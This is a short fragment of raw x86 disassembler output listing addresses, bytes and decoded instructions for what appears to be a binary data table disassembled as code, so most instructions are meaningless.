  404de9:	00 91 00 6c 12 f7    	add    %dl,-0x8ed9400(%ecx)
  404def:	00 04 00             	add    %al,(%eax,%eax,1)
  404df2:	e8 27 00 00 00       	call   0x404e1e
  404df7:	00 91 00 a3 09 d4    	add    %dl,-0x2bf65d00(%ecx)
  404dfd:	00 04 00             	add    %al,(%eax,%eax,1)
  404e00:	48                   	dec    %eax
  404e01:	28 00                	sub    %al,(%eax)
  404e03:	00 00                	add    %al,(%eax)
  404e05:	00 91 00 53 03 ad    	add    %dl,-0x52fcad00(%ecx)
  404e0b:	06                   	push   %es
  404e0c:	05 00 9c 28 00       	add    $0x289c00,%eax
  404e11:	00 00                	add    %al,(%eax)
  404e13:	00 91 00 7b 03 b9    	add    %dl,-0x46fc8500(%ecx)
  404e19:	06                   	push   %es
  404e1a:	08 00                	or     %al,(%eax)
  404e1c:	e8 28 00 00 00       	call   0x404e49
  404e21:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  404e27:	02 0a                	add    (%edx),%cl
  404e29:	00 53 29             	add    %dl,0x29(%ebx)
  404e2c:	00 00                	add    %al,(%eax)
  404e2e:	00 00                	add    %al,(%eax)
  404e30:	96                   	xchg   %eax,%esi
  404e31:	00 26                	add    %ah,(%esi)
  404e33:	14 e9                	adc    $0xe9,%al
  404e35:	02 0a                	add    (%edx),%cl
  404e37:	00 88 29 00 00 00    	add    %cl,0x29(%eax)
  404e3d:	00 91 00 29 06 f7    	add    %dl,-0x8f9d700(%ecx)
  404e43:	00 0a                	add    %cl,(%edx)
  404e45:	00 e8                	add    %ch,%al
  404e47:	29 00                	sub    %eax,(%eax)
  404e49:	00 00                	add    %al,(%eax)
  404e4b:	00 91 00 55 05 19    	add    %dl,0x19055500(%ecx)
  404e51:	01 0a                	add    %ecx,(%edx)
  404e53:	00 30                	add    %dh,(%eax)
  404e55:	2a 00                	sub    (%eax),%al
  404e57:	00 00                	add    %al,(%eax)
  404e59:	00 91 00 64 14 19    	add    %dl,0x19146400(%ecx)
  404e5f:	01 0b                	add    %ecx,(%ebx)
  404e61:	00 8c 2a 00 00 00 00 	add    %cl,0x0(%edx,%ebp,1)
  404e68:	91                   	xchg   %eax,%ecx
  404e69:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  404e6c:	19 01                	sbb    %eax,(%ecx)
  404e6e:	0c 00                	or     $0x0,%al
  404e70:	10 2b                	adc    %ch,(%ebx)
  404e72:	00 00                	add    %al,(%eax)
  404e74:	00 00                	add    %al,(%eax)
  404e76:	91                   	xchg   %eax,%ecx
  404e77:	00 2a                	add    %ch,(%edx)
  404e79:	10 19                	adc    %bl,(%ecx)
  404e7b:	01 0d 00 ac 2b 00    	add    %ecx,0x2bac00
  404e81:	00 00                	add    %al,(%eax)
  404e83:	00 91 00 3a 0f 2d    	add    %dl,0x2d0f3a00(%ecx)
  404e89:	00 0e                	add    %cl,(%esi)
  404e8b:	00 e8                	add    %ch,%al
  404e8d:	2b 00                	sub    (%eax),%eax
  404e8f:	00 00                	add    %al,(%eax)
  404e91:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
  404e97:	02 0e                	add    (%esi),%cl
  404e99:	00 28                	add    %ch,(%eax)
  404e9b:	2c 00                	sub    $0x0,%al
  404e9d:	00 00                	add    %al,(%eax)
  404e9f:	00 91 00 46 0c e9    	add    %dl,-0x16f3ba00(%ecx)
  404ea5:	02 0e                	add    (%esi),%cl
  404ea7:	00 98 2c 00 00 00    	add    %bl,0x2c(%eax)
  404ead:	00 91 18 50 0f e9    	add    %dl,-0x16f0afe8(%ecx)
